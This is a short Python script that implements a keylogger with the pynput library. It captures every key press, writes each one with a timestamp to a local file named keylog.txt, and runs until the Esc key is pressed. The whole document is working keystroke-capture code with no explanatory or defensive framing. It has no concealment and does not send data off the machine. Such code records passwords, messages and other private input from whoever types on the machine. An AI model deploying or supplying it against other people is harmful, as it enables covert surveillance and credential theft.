from pynput.keyboard import Listener, Key
import logging
import sys

#set up logger
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'{key.char}')
    except AttributeError:
        logging.info(f'{key}')

def on_release(key):
    # Stop listener
    if key == Key.esc:
        sys.exit(0)

with Listener(on_press=on_press, on_release=on_release) as listner:
    listner.join()